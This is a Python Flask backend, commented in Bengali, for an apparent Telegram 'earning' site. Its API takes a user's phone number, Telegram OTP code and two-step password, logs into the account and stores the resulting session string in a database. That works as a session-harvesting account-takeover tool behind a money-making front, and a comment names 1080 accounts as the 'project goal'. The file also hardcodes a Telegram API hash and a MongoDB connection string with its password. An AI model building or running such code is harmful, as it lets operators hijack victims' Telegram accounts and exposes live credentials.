import os
import base64
import asyncio
import datetime
import nest_asyncio
from flask import Flask, render_template, request, jsonify
from flask_cors import CORS
from pymongo import MongoClient
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from asgiref.wsgi import WsgiToAsgi # ASGI প্রোটোকলের জন্য জরুরি

# ১. ইভেন্ট লুপ প্যাচ (সার্ভারের ইন্টারনাল এরর ফিক্স করে)
nest_asyncio.apply()

app = Flask(__name__)
CORS(app)

# --- ২. কনফিগারেশন ও ডাটাবেস কানেকশন ---
API_ID = 36466824      
API_HASH = '535ddcb85f2c3c74cc0ff532dd2c3406'  
SECRET_KEY = b'AAF_STRONG_APP_SECURE_32_BIT_KEY' 

MONGO_URI = "mongodb+srv://abdullahasfakfarvezbd_db_user:Abdullah6790@cluster0.rmulyqq.mongodb.net/?appName=Cluster0"

try:
    client_db = MongoClient(MONGO_URI, serverSelectionTimeoutMS=5000)
    db = client_db['AAF_TeleEarn'] 
    users_col = db['users']
    sessions_col = db['sessions']
    withdrawals_col = db['withdrawals']
    print("✅ MongoDB কানেকশন সফল!")
except Exception as e:
    print(f"❌ MongoDB কানেকশন এরর: {e}")

temp_clients = {}

# --- ৩. সেশন এনক্রিপশন লজিক ---
def encrypt_session(session_str):
    cipher = AES.new(SECRET_KEY, AES.MODE_CBC)
    ct_bytes = cipher.encrypt(pad(session_str.encode(), AES.block_size))
    iv = base64.b64encode(cipher.iv).decode('utf-8')
    ct = base64.b64encode(ct_bytes).decode('utf-8')
    return f"{iv}:{ct}"

# --- ৪. সব ফ্রন্টএন্ড পেজ রুটস ---
@app.route('/')
@app.route('/dashboard')
def dashboard(): return render_template('dashboard.html')

@app.route('/login')
def login(): return render_template('login.html')

@app.route('/wallet')
def wallet(): return render_template('wallet.html')

@app.route('/task')
def task_page(): return render_template('task.html')

@app.route('/trading')
def trading(): return render_template('trading.html')

@app.route('/account')
def account(): return render_template('account.html')

# --- ৫. ওটিপি পাঠানোর লজিক (অ্যাসিঙ্ক টাস্ক ফিক্সসহ) ---
@app.route('/api/send_otp', methods=['POST'])
async def send_otp():
    data = request.json
    phone = data.get('phone')
    if not phone: return jsonify({"success": False, "message": "নম্বর প্রয়োজন"})
    
    try:
        loop = asyncio.get_event_loop()
        client = TelegramClient(StringSession(), API_ID, API_HASH, loop=loop)
        
        async def run_task():
            if not client.is_connected(): await client.connect()
            return await client.send_code_request(phone)
        
        # টাইমআউট এরর এড়াতে create_task ব্যবহার
        sent_code = await asyncio.wait_for(asyncio.create_task(run_task()), timeout=35)
        temp_clients[phone] = {'client': client, 'phone_code_hash': sent_code.phone_code_hash}
        return jsonify({"success": True, "message": "ওটিপি পাঠানো হয়েছে!"})
    except Exception as e:
        print(f"OTP Error: {e}")
        return jsonify({"success": False, "message": str(e)})

# --- ৬. লগইন ভেরিফাই ও ইউজার ডাটা সেভ ---
@app.route('/api/verify_login', methods=['POST'])
async def verify_login():
    data = request.json
    phone, code, password, full_name = data.get('phone'), data.get('code'), data.get('password'), data.get('name', 'User')

    if phone not in temp_clients:
        return jsonify({"success": False, "message": "সেশন পাওয়া যায়নি"})

    client = temp_clients[phone]['client']
    try:
        async def verify_task():
            try:
                return await client.sign_in(phone, code, phone_code_hash=temp_clients[phone]['phone_code_hash'])
            except SessionPasswordNeededError:
                if not password: return "NEED_PASS"
                return await client.sign_in(password=password)

        result = await asyncio.create_task(verify_task())
        if result == "NEED_PASS": return jsonify({"success": False, "message": "২-স্টেপ পাসওয়ার্ড দিন"})

        me = await client.get_me()
        encrypted_session = encrypt_session(client.session.save())

        # ডাটাবেসে ইউজার প্রোফাইল তৈরি
        user_data = {
            "telegram_id": me.id, "name": full_name, "phone": phone,
            "status": "Active", "main_balance": 0.0, "created_at": datetime.datetime.now()
        }
        users_col.update_one({"telegram_id": me.id}, {"$set": user_data}, upsert=True)
        sessions_col.update_one({"phone": phone}, {"$set": {"session": encrypted_session}}, upsert=True)
        
        await client.disconnect()
        if phone in temp_clients: del temp_clients[phone]
        return jsonify({"success": True, "user_id": str(me.id)})
    except Exception as e:
        return jsonify({"success": False, "message": str(e)})

# --- ৭. ড্যাশবোর্ড ও অ্যাকাউন্ট এপিআই ---
@app.route('/api/user_profile/<user_id>', methods=['GET'])
def get_user_profile(user_id):
    try:
        user = users_col.find_one({"telegram_id": int(user_id)})
        if user:
            return jsonify({
                "status": "success",
                "name": user.get('name', 'N/A'),
                "phone": user.get('phone', 'N/A'),
                "telegram_id": user.get('telegram_id'),
                "main_balance": float(user.get('main_balance', 0.0)),
                "total_accounts": 1080, # আপনার প্রজেক্ট গোল
                "active_accounts": 950,
                "created_at": user.get('created_at', datetime.datetime.now()).strftime("%d %b %Y")
            })
        return jsonify({"status": "error", "message": "ইউজার পাওয়া যায়নি"}), 404
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

# --- ৮. ASGI অ্যাপ অ্যাডাপ্টার (Uvicorn এর জন্য) ---
asgi_app = WsgiToAsgi(app)

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)
